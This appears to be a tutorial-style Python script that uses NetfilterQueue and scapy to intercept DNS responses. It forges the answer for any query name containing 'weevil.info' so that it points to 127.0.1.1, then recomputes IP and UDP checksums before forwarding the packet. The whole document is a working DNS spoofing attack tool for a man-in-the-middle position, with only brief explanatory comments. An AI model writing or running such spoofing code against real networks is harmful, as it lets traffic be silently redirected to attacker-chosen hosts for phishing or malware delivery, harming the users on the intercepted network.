#! usr/bin/env/python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy

def print_and_accept(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        #We want to access the qname field on the packet
        qname = scapy_packet[scapy.DNSQR].qname
        if 'weevil.info' in qname:
            print("[+]Spoofing target: ")
            answer = scapy.DNSRR(rrname = qname, rdata = "127.0.1.1")
            #This is the IP or list to modify. As before, its possible to save the possible to save IPs and addresses  and check the elements in the list
            #DNS Resource Record
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            #deleting len and chksum from the IP and UDP layer, scapy will calculate new values
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print
